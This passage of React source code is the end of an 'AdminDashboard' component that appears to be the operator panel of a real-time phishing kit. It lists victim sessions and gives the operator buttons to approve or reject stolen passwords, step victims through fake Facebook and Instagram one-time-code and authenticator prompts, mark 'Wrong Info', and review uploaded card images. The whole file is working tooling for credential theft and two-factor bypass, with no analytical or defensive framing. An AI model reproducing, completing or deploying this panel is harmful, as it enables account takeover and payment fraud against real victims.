                                    md: "repeat(2, 1fr)",
                                    lg: "repeat(3, 1fr)",
                                  }}
                                  gap={4}
                                >
                                  {Array.isArray(event.data) ? (
                                    event.data.map((file, index) => (
                                      <Box
                                        key={index}
                                        borderWidth="1px"
                                        borderRadius="lg"
                                        p={4}
                                        overflow="hidden"
                                      >
                                        {file.fileType?.startsWith("image/") ? (
                                          <Image
                                            src={file.url}
                                            alt={file.fileName}
                                            w="full"
                                            h="12rem"
                                            objectFit="cover"
                                            borderRadius="md"
                                            mb={2}
                                          />
                                        ) : (
                                          <Flex
                                            w="full"
                                            h="12rem"
                                            bg="gray.100"
                                            align="center"
                                            justify="center"
                                            borderRadius="md"
                                            mb={2}
                                          >
                                            <Text color="gray.500">
                                              Non-image file
                                            </Text>
                                          </Flex>
                                        )}
                                        <Box fontSize="sm">
                                          <Text fontWeight="medium" isTruncated>
                                            {file.fileName}
                                          </Text>
                                          <Text color="gray.500">
                                            {file.fileType}
                                          </Text>
                                          <Text color="gray.500" fontSize="xs">
                                            Uploaded:{" "}
                                            {new Date(
                                              file.uploadedAt
                                            ).toLocaleString()}
                                          </Text>
                                        </Box>
                                      </Box>
                                    ))
                                  ) : (
                                    <Text>No files uploaded</Text>
                                  )}
                                </Grid>
                              </>
                            ) : (
                              event.data
                            )}
                          </Text>
                        </GridItem>
                      </Grid>

                      {event.status === "pending" &&
                        (event.type !== "authenticator-select" ? (
                          (() => {
                            switch (event.type) {
                              case "verifycode-select":
                                return (
                                  <>
                                    {createButton(
                                      "green",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "verify"
                                        ),
                                      "Verify vcode-select"
                                    )}
                                    {createButton(
                                      "red",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "cancel"
                                        ),
                                      "Deny vcode-select"
                                    )}
                                  </>
                                );
                              case "email-verification":
                                return (
                                  <>
                                    <>
                                      {createButton(
                                        "green",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "email"
                                          ),
                                        "Verify email"
                                      )}
                                      {createButton(
                                        "red",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "cancel"
                                          ),
                                        "Deny email"
                                      )}
                                    </>
                                  </>
                                );
                              case "password-submission":
                                return (
                                  <>
                                    <HStack spacing={4} mt={4}>
                                      <Input
                                        type="text"
                                        name="phone"
                                        value={phone}
                                        onChange={(e) =>
                                          setPhone(e.target.value)
                                        }
                                        placeholder="Enter Phone Number"
                                      />
                                      {createButton(
                                        "green",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "phone"
                                            // { password }
                                          ),
                                        "Approve pass"
                                      )}
                                      {createButton(
                                        "red",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "cancel"
                                          ),
                                        "Deny pass"
                                      )}
                                    </HStack>
                                  </>
                                );
                              case "verify-click":
                                return (
                                  <>
                                    {createButton(
                                      "green",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "continue"
                                        ),
                                      "Approve verify-click"
                                    )}
                                    {createButton(
                                      "red",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "cancel"
                                        ),
                                      "Deny verify-click"
                                    )}
                                  </>
                                );
                              case "text-select":
                                return (
                                  <>
                                    {createButton(
                                      "green",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "approve"
                                        ),
                                      "Approve text-select"
                                    )}
                                    {createButton(
                                      "red",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "cancel"
                                        ),
                                      "Deny text-select"
                                    )}
                                  </>
                                );
                              case "text-click":
                                return (
                                  <>
                                    {createButton(
                                      "green",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "continue"
                                        ),
                                      "Approve text-click"
                                    )}
                                    {createButton(
                                      "red",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "cancel"
                                        ),
                                      "Deny text-click"
                                    )}
                                  </>
                                );
                              case "call-select":
                                return (
                                  <>
                                    {createButton(
                                      "green",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "call"
                                        ),
                                      "Approve call-select"
                                    )}
                                    {createButton(
                                      "red",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "cancel"
                                        ),
                                      "Deny call-select"
                                    )}
                                  </>
                                );

                              case "ig_attempt_init":
                                return (
                                  <>
                                    <HStack spacing={4} mt={4}>
                                      <Input
                                        type="text"
                                        name="sendTo"
                                        value={sendTo}
                                        onChange={(e) =>
                                          setSendTo(e.target.value)
                                        }
                                        placeholder="Where did you send code to?"
                                      />
                                      {createButton(
                                        "green",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "login"
                                            // { password }
                                          ),
                                        "Approve login"
                                      )}
                                      {createButton(
                                        "red",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "cancel"
                                          ),
                                        "Deny login"
                                      )}
                                    </HStack>
                                  </>
                                );

                              case "auth_value_submit":
                                return (
                                  <>
                                    {createButton(
                                      "green",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "continue"
                                        ),
                                      "Approve IG OTP"
                                    )}
                                    {createButton(
                                      "red",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "cancel"
                                        ),
                                      "Deny IG OTP"
                                    )}
                                  </>
                                );

                              case "stay_signed_in":
                                return (
                                  <>
                                    <HStack spacing={4} mt={4}>
                                      {createButton(
                                        "green",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "approve"
                                            // { password }
                                          ),
                                        "Approve Thanks4Coming"
                                      )}
                                      {createButton(
                                        "red",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "cancel"
                                          ),
                                        "Deny Thanks4Coming"
                                      )}
                                    </HStack>
                                  </>
                                );

                              case "fb_attempt_init":
                                return (
                                  <>
                                    <HStack spacing={4} mt={4}>
                                      <Input
                                        type="text"
                                        name="sendTo"
                                        value={sendTo}
                                        onChange={(e) =>
                                          setSendTo(e.target.value)
                                        }
                                        placeholder="Where did you send code to?"
                                      />
                                      {createButton(
                                        "orange",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "approve"
                                            // { password }
                                          ),
                                        "Goto Approval"
                                      )}
                                      {createButton(
                                        "green",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "login"
                                            // { password }
                                          ),
                                        "Goto OTP"
                                      )}
                                      {createButton(
                                        "yellow",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "wrong"
                                            // { password }
                                          ),
                                        "Wrong Info"
                                      )}
                                      {createButton(
                                        "red",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "cancel"
                                          ),
                                        "Deny login"
                                      )}
                                    </HStack>
                                  </>
                                );

                              case "fb_otp":
                                return (
                                  <>
                                    {createButton(
                                      "green",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "continue"
                                        ),
                                      "Approve FB OTP"
                                    )}
                                    {createButton(
                                      "red",
                                      () =>
                                        handleResponse(
                                          sessionId,
                                          index,
                                          "cancel"
                                        ),
                                      "Deny FB OTP"
                                    )}
                                  </>
                                );

                              case "fb_resend_otp":
                                return (
                                  <>
                                    <HStack spacing={4} mt={4}>
                                      <Input
                                        type="text"
                                        name="sendTo"
                                        value={sendTo}
                                        onChange={(e) =>
                                          setSendTo(e.target.value)
                                        }
                                        placeholder="Where did you send code to?"
                                      />
                                      {createButton(
                                        "green",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "resend"
                                            // { password }
                                          ),
                                        "Approve resend"
                                      )}
                                      {createButton(
                                        "red",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "cancel"
                                          ),
                                        "Deny resend"
                                      )}
                                    </HStack>
                                  </>
                                );

                              case "fb_card_upload":
                                return (
                                  <>
                                    <HStack spacing={4} mt={4}>
                                      {createButton(
                                        "green",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "continue"
                                            // { password }
                                          ),
                                        "Approve Cards"
                                      )}
                                      {createButton(
                                        "red",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "cancel"
                                          ),
                                        "Deny Cards"
                                      )}
                                    </HStack>
                                  </>
                                );

                              case "fb_approval_mounted":
                                return (
                                  <>
                                    <HStack spacing={4} mt={4}>
                                      {createButton(
                                        "green",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "continue"
                                            // { password }
                                          ),
                                        "Approve"
                                      )}
                                      {createButton(
                                        "red",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "cancel"
                                          ),
                                        "Deny"
                                      )}
                                    </HStack>
                                  </>
                                );

                              case "fb_another_way":
                                return (
                                  <>
                                    <HStack spacing={4} mt={4}>
                                      <Input
                                        type="text"
                                        name="sendTo"
                                        value={sendTo}
                                        onChange={(e) =>
                                          setSendTo(e.target.value)
                                        }
                                        placeholder="Where did you send code to?"
                                      />
                                      {createButton(
                                        "green",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "continue"
                                            // { password }
                                          ),
                                        "Goto OTP"
                                      )}
                                      {createButton(
                                        "red",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "cancel"
                                          ),
                                        "Deny"
                                      )}
                                    </HStack>
                                  </>
                                );

                              case "fb_done":
                                return (
                                  <>
                                    <HStack spacing={4} mt={4}>
                                      {createButton(
                                        "green",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "done"
                                            // { password }
                                          ),
                                        "Done"
                                      )}
                                      {createButton(
                                        "red",
                                        () =>
                                          handleResponse(
                                            sessionId,
                                            index,
                                            "cancel"
                                          ),
                                        "Deny "
                                      )}
                                    </HStack>
                                  </>
                                );

                              default:
                                return <Text>No Button for you yet</Text>;
                            }
                          })()
                        ) : (
                          <HStack spacing={4} mt={4}>
                            <Input
                              type="text"
                              name="authNumber"
                              value={authNumber}
                              onChange={(e) => setAuthNumber(e.target.value)}
                              placeholder="Enter Number From Authenticator"
                            />
                            {createButton(
                              "green",
                              () =>
                                handleResponse(
                                  sessionId,
                                  index,
                                  "authenticate"
                                ),
                              "Approve auth-select"
                            )}
                          </HStack>
                        ))}

                      {event.status === "authenticate" && (
                        <Button
                          colorScheme="green"
                          onClick={() =>
                            handleResponse(sessionId, index, "continue")
                          }
                        >
                          Authenticate
                        </Button>
                      )}

                      {event.status === "call" && (
                        <Button
                          colorScheme="green"
                          onClick={() =>
                            handleResponse(sessionId, index, "continue")
                          }
                        >
                          Call Authenticated
                        </Button>
                      )}

                      {/* {event.status === "pending" &&
                      event.type !== "authenticator-select" ? (
                        <HStack spacing={4} mt={4}>
                          <Button
                            colorScheme="green"
                            onClick={() =>
                              handleResponse(sessionId, index, "continue")
                            }
                          >
                            Approve
                          </Button>
                          <Button
                            colorScheme="red"
                            onClick={() =>
                              handleResponse(sessionId, index, "cancel")
                            }
                          >
                            Deny
                          </Button>
                        </HStack>
                      ) : (
                        <>
                          <HStack>
                            <Input
                              type="text"
                              name="authNumber"
                              value={authNumber}
                              onChange={(e) => {
                                setAuthNumber(e.target.value);
                              }}
                              placeholder="Enter Number From Authenticator"
                            />
                            <Button
                              colorScheme="green"
                              onClick={() =>
                                handleResponse(sessionId, index, "continue")
                              }
                            >
                              Approve
                            </Button>
                          </HStack>
                        </>
                      )} */}
                    </Box>
                  </Card.Description>
                </Card.Root>
              ))}
            </VStack>
          ))}

          {filteredSessions.length === 0 && (
            <Text textAlign="center" color="gray.500">
              {searchQuery
                ? "No sessions found matching your search."
                : "No active sessions."}
            </Text>
          )}
        </VStack>
      </Box>
    </Box>
  );
};

export default AdminDashboard;
